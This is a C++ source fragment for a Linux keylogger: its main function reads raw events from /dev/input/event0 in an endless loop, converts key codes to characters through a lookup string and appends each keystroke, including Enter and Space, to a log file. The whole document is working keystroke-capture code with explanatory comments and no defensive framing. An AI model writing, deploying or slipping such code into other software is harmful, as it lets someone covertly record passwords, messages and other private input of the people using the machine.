int main(int argc, char **argv)
{
    // Open the input event device (keyboard)
    struct input_event ev;
    int fd = open("/dev/input/event0", O_RDONLY);
    if (fd == -1) {
        perror("open");
        return 1; // Exit with an error code
    }

    // Open the log file for writing
    std::ofstream fp(LOGFILE, std::ios::app);
    if (!fp.is_open()) {
        perror("fopen");
        close(fd);
        return 1; // Exit with an error code
    }

    // Define a keyboard mapping for character conversion
    char map[] = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./";

    while (1)
    {
        // Read input events from the keyboard device
        if (read(fd, &ev, sizeof(ev)) == -1) {
            perror("read");
            break; // Exit loop on error
        }

        // Check if the event is a key press (EV_KEY) and a key release (ev.value == 0)
        if ((ev.type == EV_KEY) && (ev.value == 0))
        {
            fp.flush();

            // Translate and log the key press
            switch (ev.code)
            {
                case 28:
                    // Enter key, insert a newline in the log file
                    fp << "\n";
                    break;
                case 57:
                    // Space key, insert a space character in the log file
                    fp << " ";
                    break;
                default:
                    // Map the key code to a character using the 'map' array
                    // and log the character in the file
                    fp << map[ev.code];
            }
        }
    }

    // Close the log file and the input device
    fp.close();
    close(fd);

    return 0; // Exit normally
}
